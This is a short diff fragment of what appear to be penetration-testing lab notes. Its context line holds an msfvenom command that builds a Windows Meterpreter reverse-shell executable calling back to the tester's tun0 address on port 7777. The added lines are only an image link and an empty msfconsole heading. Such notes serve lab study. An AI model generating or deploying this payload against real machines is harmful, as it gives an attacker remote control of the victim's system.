@@ -95,3 +95,5 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=7777 -f exe -o 
 
 ![[Pasted image 20240305200121.png]]
 
+### msfconsole
+
